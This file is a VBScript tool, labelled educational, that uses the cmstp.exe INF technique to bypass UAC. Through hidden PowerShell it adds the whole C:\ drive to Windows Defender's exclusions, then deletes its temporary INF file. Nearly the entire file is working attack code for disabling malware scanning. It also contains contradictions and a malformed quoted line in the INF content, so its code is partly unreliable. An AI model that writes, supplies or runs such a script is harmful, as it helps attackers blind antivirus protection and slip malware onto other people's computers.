' Script VBScript con autoelevación usando cmstp.exe (UAC Bypass)
' Método educativo para parcial universitario
' Requiere privilegios de administrador

Option Explicit

Dim ws, fso, tempFolder, infFile, scriptPath
Dim psCommand, result, checkCommand
Dim cmstpPath

' Crear objetos necesarios
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

scriptPath = WScript.ScriptFullName
tempFolder = fso.GetSpecialFolder(2) ' Temp folder
cmstpPath = ws.ExpandEnvironmentStrings("%SystemRoot%\System32\cmstp.exe")

' Verificar si cmstp.exe existe
If Not fso.FileExists(cmstpPath) Then
    MsgBox "cmstp.exe no encontrado en: " & cmstpPath, vbCritical, "Error"
    WScript.Quit 1
End If

' Crear archivo .inf temporal para cmstp
infFile = tempFolder & "\" & fso.GetBaseName(scriptPath) & ".inf"

' Crear contenido del archivo .inf que ejecutará PowerShell con privilegios elevados
Dim infContent
infContent = "[version]" & vbCrLf & _
    "Signature=$CHICAGO$" & vbCrLf & _
    "AdvancedINF=2.5" & vbCrLf & _
    "[DefaultInstall]" & vbCrLf & _
    "CustomDestination=CustomDestAllUsers" & vbCrLf & _
    "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf & _
    "[RunPreSetupCommandsSection]" & vbCrLf & _
    "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& {" & _
        "$ErrorActionPreference = 'Stop'; " & _
        "try { " & _
            "Add-MpPreference -ExclusionPath 'C:\' -ErrorAction Stop; " & _
            "Write-Host 'Exclusión agregada exitosamente'; " & _
            "exit 0 " & _
        "} catch { " & _
            "Write-Host 'Error: ' + $_.Exception.Message; " & _
            "exit 1 " & _
        "}" & _
    "}""" & vbCrLf & _
    "del /q /f %temp%\" & fso.GetBaseName(scriptPath) & ".inf" & vbCrLf & _
    "[CustomDestAllUsers]" & vbCrLf & _
    "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf & _
    "[AllUSer_LDIDSection]" & vbCrLf & _
    ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

' Escribir archivo .inf
On Error Resume Next
Dim ts
Set ts = fso.CreateTextFile(infFile, True)
ts.Write infContent
ts.Close
Set ts = Nothing

If Err.Number <> 0 Then
    MsgBox "Error al crear archivo .inf: " & Err.Description, vbCritical, "Error"
    WScript.Quit 1
End If
On Error GoTo 0

' Verificar si Windows Defender está disponible antes de ejecutar
checkCommand = "powershell -WindowStyle Hidden -Command ""Get-MpPreference -ErrorAction SilentlyContinue | Out-Null; if ($?) { exit 0 } else { exit 1 }"""
result = ws.Run(checkCommand, 0, True)

If result <> 0 Then
    ' Limpiar archivo .inf si Windows Defender no está disponible
    If fso.FileExists(infFile) Then fso.DeleteFile infFile
    MsgBox "Windows Defender no está disponible o no está instalado.", vbExclamation, "Advertencia"
    WScript.Quit 1
End If

' Ejecutar cmstp.exe con el archivo .inf (esto ejecutará PowerShell con privilegios elevados)
On Error Resume Next
' Usar /au para instalación automática sin UI
ws.Run Chr(34) & cmstpPath & Chr(34) & " /au " & Chr(34) & infFile & Chr(34), 0, True
On Error GoTo 0

' Esperar un momento para que se complete la ejecución
WScript.Sleep 3000

' Verificar si la exclusión se agregó correctamente
checkCommand = "powershell -WindowStyle Hidden -Command """ & _
    "$exclusions = Get-MpPreference -ExclusionPath; " & _
    "if ($exclusions -contains 'C:\') { exit 0 } else { exit 1 }""" & ""

result = ws.Run(checkCommand, 0, True)

' Limpiar archivo .inf si aún existe
If fso.FileExists(infFile) Then
    On Error Resume Next
    fso.DeleteFile infFile
    On Error GoTo 0
End If

If result = 0 Then
    MsgBox "La unidad C:\ ha sido excluida exitosamente de Windows Defender usando cmstp.exe.", vbInformation, "Éxito"
    WScript.Quit 0
Else
    MsgBox "No se pudo verificar la exclusión. El comando puede haber fallado.", vbExclamation, "Advertencia"
    WScript.Quit 1
End If
